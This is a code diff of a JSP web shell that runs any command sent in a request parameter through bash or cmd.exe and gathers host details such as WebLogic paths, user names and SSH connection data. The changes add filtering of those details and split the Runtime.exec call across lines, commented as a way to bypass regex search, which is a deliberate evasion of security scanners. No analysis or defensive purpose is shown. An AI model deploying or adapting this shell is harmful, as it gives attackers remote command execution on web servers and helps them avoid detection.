@@ -1,28 +1,30 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
-String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n";
-
+String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szKeys = "JAVA_HOME,SERVER_NAME,PWD,LONG_DOMAIN_HOME,BEA_HOME,LOGNAME,USER,DOMAIN_HOME,SSH_CONNECTION,OLDPWD,MW_HOME,WL_HOME,WLS_HOME,os.name,weblogic.Name,user.name,weblogic.home,java.security.policy,user.home,wls.home,user.dir,WLS_POLICY_FILE,HOSTNAME,USERNAME,HOMEPATH,LOCALAPPDATA,USERDOMAIN,LOGONSERVER,OS,USERPROFILE,vde.home,";
+String bsK = "bash";
 Map<String, String> env = System.getenv();
 for (String envName : env.keySet())
 {
-    szSys += envName + " = " + env.get(envName) + "\n";
+    if(null != envName && -1 < szKeys.indexOf(envName))
+    szSys += envName + "=\"" + env.get(envName) + "\"\n";
 }
 
 Properties capitals = System.getProperties();
 Set states = capitals.keySet();
 for (Object name : states)
 {
-    szSys += (String)name + " = " + (String)capitals.getProperty((String) name) + "\n";
+    if(null != name && -1 < szKeys.indexOf((String)name))
+    szSys += (String)name + "=\"" + (String)capitals.getProperty((String) name) + "\"\n";
 }
 
-if(-1 < szSys.indexOf(":\\Windows") || -1 < szSys.indexOf("\\cmd.exe") )
+if(-1 < szSys.indexOf("Windows") || -1 < cmd.indexOf("cmd"))
 {
     bh = "%ComSpec%";
     cS = "/c";
 }
-else if(null != request.getParameter("bash"))
+else if(null != request.getParameter(bsK))
 {
-    bh = request.getParameter("bash").toString();
+    bh = request.getParameter(bsK).toString();
     if(-1 < bh.indexOf("cmd"))cS = "/c";
 }
 if (cmd != null)
@@ -32,8 +34,15 @@ if (cmd != null)
     OutputStream os = null;
     InputStream in = null;
     int x = 0;
-    try{
-        p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
+    try{// by pass reg search
+        p = Runtime
+        .
+        getRuntime
+        (
+        )
+        .
+        exec
+        (new String[]{bh,cS,cmd});
         // p.waitFor();
         os = p.getOutputStream();
         in = p.getInputStream();
@@ -49,7 +58,14 @@ if (cmd != null)
     } catch (Exception x6) {
         szSys += "\n" + x6.getMessage() + "\n";
         try{
-            p = Runtime.getRuntime().exec(cmd);
+            p = Runtime
+            .
+            getRuntime
+            (
+            )
+            .
+            exec
+            (cmd);
             // p.waitFor();
 
             os = p.getOutputStream();
